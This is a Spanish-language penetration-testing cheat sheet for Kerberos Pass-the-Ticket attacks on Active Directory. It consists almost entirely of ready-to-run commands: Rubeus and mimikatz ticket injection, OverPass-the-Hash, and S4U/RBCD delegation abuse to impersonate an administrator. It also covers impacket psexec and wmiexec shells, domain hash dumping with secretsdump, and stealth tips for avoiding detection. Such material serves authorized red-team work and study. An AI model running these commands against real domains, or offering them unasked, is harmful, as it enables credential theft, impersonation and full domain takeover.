---
aliases:
  - PtT inject
  - kerberos ptt
  - ticket injection
tags:
  - type/technique
  - technique/lateral-movement
  - env/windows
  - env/linux
  - asset/active-directory
  - cred/kerberos
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[Pass-the-Ticket]]"
---
# Pass-the-Ticket - Inyección y Uso

***

## Rubeus ptt (Windows)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe ptt /ticket:<BASE64>` | Inyecta TGT/TGS en sesión actual | Standard inject. |
| `Rubeus.exe ptt /ticket:ticket.kirbi` | Inyecta desde archivo .kirbi | Post-export. |
| `Rubeus.exe purge && Rubeus.exe ptt /ticket:T` | Purge + inject limpio | Evitar ticket collision. |
| `Rubeus.exe ptt /ticket:T /luid:<ID>` | Inject en otra sesión (requiere priv) | Cross-session. |
| `klist` | Verificar inject | Post-inject check. |
^ptt-inject-rubeus

```powershell
# Purge + inject
.\Rubeus.exe purge
.\Rubeus.exe ptt /ticket:doIFqjCCBaag...
klist

# Verificar acceso post-inject
dir \\dc01.corp.local\c$
```

___

## mimikatz kerberos::ptt (Windows)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `kerberos::ptt ticket.kirbi` | Inyecta .kirbi en sesión | Directo post-export. |
| `kerberos::list` | Lista tickets inyectados | Verificar. |
| `kerberos::purge` | Limpia tickets de sesión | Pre/post operación. |
^ptt-inject-mimi

```
mimikatz # kerberos::ptt [0;3e7]-0-0-40e10000-admin@krbtgt-CORP.LOCAL.kirbi
mimikatz # kerberos::list
exit

klist  # Confirmar en cmd
dir \\target\c$  # Usar
```

___

## impacket -k -no-pass (Linux)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-psexec -k -no-pass corp/admin@target.corp.local` | Shell via SMB + Kerberos | RCE. |
| `impacket-wmiexec -k -no-pass corp/admin@target.corp.local` | Shell via WMI + Kerberos | Menos ruido que psexec. |
| `impacket-smbclient -k -no-pass corp/admin@target.corp.local` | SMB client | File access. |
| `impacket-secretsdump -k -no-pass -just-dc corp/admin@dc.corp.local` | Domain dump | Post-DA ticket. |
| `impacket-wmiexec -k -no-pass -target-ip 10.10.10.5 corp/admin@target.corp.local` | Con IP explícita | Cuando DNS falla. |
^ptt-inject-impacket

```bash
export KRB5CCNAME=administrator.ccache
klist  # Verificar ticket

# Shell en target
impacket-wmiexec -k -no-pass corp.local/administrator@target.corp.local

# DC dump
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/administrator@dc01.corp.local
```

___

## OverPass-the-Hash (hash → TGT → PtT)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe asktgt /user:admin /rc4:NTHASH /domain:corp.local /ptt` | NTLM hash → TGT → inject | PtH con Kerberos (evitar NTLM). |
| `Rubeus.exe asktgt /user:admin /aes256:AESHASH /domain:corp.local /ptt /opsec` | AES hash → TGT → inject (OPSEC) | Stealthier — AES256 vs RC4. |
| `Rubeus.exe asktgt /user:admin /rc4:HASH /dc:dc01.corp.local /ptt /nowrap` | Con DC explícito | Entorno multi-DC. |
^ptt-inject-opth

```powershell
# Con NT hash (RC4) — más detectable
.\Rubeus.exe asktgt /user:svc_admin /rc4:5f4dcc3b5aa765d61d8327deb882cf99 /domain:corp.local /ptt

# Con AES256 — OPSEC preferred
.\Rubeus.exe asktgt /user:svc_admin /aes256:AESHASH /domain:corp.local /ptt /opsec

klist
dir \\target\c$
```

___

## S4U (getST — delegation abuse)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-getST -spn cifs/target -impersonate admin corp/svc:pass` | S4U2Self + S4U2Proxy → ticket impersonando admin | Constrained delegation / RBCD. |
| `impacket-getST -spn cifs/target -impersonate admin -hashes :NT corp/svc` | Idem con hash | Sin password. |
| `Rubeus.exe s4u /ticket:<TGT_svc> /impersonateuser:admin /msdsspn:cifs/target /ptt` | S4U desde Windows | Delegation abuse. |
^ptt-inject-s4u

```bash
# Linux — RBCD abuse
impacket-getST \
  -spn cifs/dc01.corp.local \
  -impersonate administrator \
  corp.local/attacker\$:'P@ssword'
export KRB5CCNAME=administrator@cifs_dc01.corp.local.ccache
impacket-psexec -k -no-pass corp.local/administrator@dc01.corp.local
```

___

## Requirements y troubleshooting

| **Requisito** | **Detalle** | **Fix** |
|:---:|:---:|:---:|
| FQDN — no IP | Kerberos usa hostname para SPN lookup | Agregar a `/etc/hosts` o DNS |
| Clock skew < 5 min | KDC rechaza tickets fuera de ventana | `ntpdate <DC>` o `timedatectl` |
| DNS funcional | SPN resolution requiere DNS | `/etc/resolv.conf` → DC como nameserver |
| Port 88 (KDC) | Request TGT/TGS requiere Kerberos port | Verificar con `nc -zv dc01 88` |
| Nombre correcto de user en SPN | `corp.local/admin@target.corp.local` | FQDN completo del target |
^ptt-inject-req

```bash
# Fix FQDN sin DNS
echo "10.10.10.5 target.corp.local" >> /etc/hosts

# Fix clock skew
sudo ntpdate dc01.corp.local
# o
sudo timedatectl set-ntp true

# Verificar port Kerberos
nc -zv dc01.corp.local 88

# Uso con IP explícita (impacket workaround)
impacket-psexec -k -no-pass corp.local/admin@target.corp.local -target-ip 10.10.10.5
```

***
